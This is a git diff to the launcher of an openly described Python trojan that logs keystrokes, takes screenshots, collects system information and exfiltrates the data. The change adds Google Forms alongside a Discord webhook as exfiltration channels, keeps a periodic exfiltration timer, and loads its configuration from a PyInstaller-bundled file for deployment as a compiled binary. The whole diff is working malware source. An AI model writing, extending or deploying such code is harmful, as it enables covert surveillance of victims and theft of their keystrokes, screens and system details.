@@ -3,6 +3,7 @@
 
 __author__ = "EONRaider @ keybase.io/eonraider"
 
+import argparse
 import configparser
 import os
 import platform
@@ -75,19 +76,47 @@ class Trojan:
                 executor.submit(module.execute)
 
 
+def cli_parser() -> argparse.Namespace:
+    parser = argparse.ArgumentParser(
+        description="BCA Trojan - Log keystrokes, takes screenshots, grab "
+                    "system information and exfiltrate to Discord and Google "
+                    "Forms"
+    )
+    parser.add_argument(
+        "-w", "--webhook",
+        type=str,
+        metavar="<webhook_url>",
+        help="URL of a Webhook for the Discord server."
+    )
+    parser.add_argument(
+        "-f", "--forms",
+        type=str,
+        metavar="<google_forms_url>",
+        help="URL of a remote instance of Google Forms."
+    )
+    parser.add_argument(
+        "-e", "--exfil-time",
+        type=float,
+        metavar="<seconds>",
+        default=30,
+        help="Time in seconds to wait between periodic executions of the "
+             "exfiltration of logged data. Defaults to 30 seconds. Set to None "
+             "to perform a single operation."
+    )
+
+    args = parser.parse_args()
+
+    if not any((args.webhook, args.forms)):
+        raise SystemExit(
+            "Error: At least one exfiltration method is required to run/build "
+            "the application. Set a Discord webhook and/or a Google Forms "
+            "URL and try again."
+        )
+
+    return args
+
+
 if __name__ == "__main__":
-    import argparse
-
-    parser = argparse.ArgumentParser()
-    parser.add_argument("-w", "--webhook",
-                        type=str,
-                        metavar="<webhook_url>")
-    parser.add_argument("-e", "--exfil-time",
-                        type=float,
-                        metavar="<seconds>",
-                        default=30)
-    _args = parser.parse_args()
-
     try:
         '''Trojan is executed as a binary compiled by PyInstaller. All 
         configuration options are read from the 'trojan.cfg' file that 
@@ -97,19 +126,20 @@ if __name__ == "__main__":
         directory does not exist then an AttributeError is raised.'''
         tmp_dir = Path(sys._MEIPASS)
         config = configparser.ConfigParser()
-        config_file = config.read(tmp_dir.joinpath("trojan.cfg"))
-        if len(config_file) == 0:
-            raise SystemExit(
-                "Cannot initialize the trojan without specification of a "
-                "Discord Webhook URL to connect to."
-            )
+        config.read(tmp_dir.joinpath("trojan.cfg"))
         client_cfg = config["TROJAN"]
         Trojan(
-            webhook=client_cfg.get("Webhook"),
+            discord_webhook=client_cfg.get("Webhook"),
+            google_forms_url=client_cfg.get("GoogleFormsUrl"),
             exfil_time=client_cfg.getint("ExfiltrationTime")
         ).execute()
     except AttributeError:
         '''Trojan is executed from source code by the system interpreter 
         for development purposes. All configuration options are parsed 
         from the CLI.'''
-        Trojan(webhook=_args.webhook, exfil_time=_args.exfil_time).execute()
+        _args = cli_parser()
+        Trojan(
+            discord_webhook=_args.webhook,
+            google_forms_url=_args.forms,
+            exfil_time=_args.exfil_time
+        ).execute()
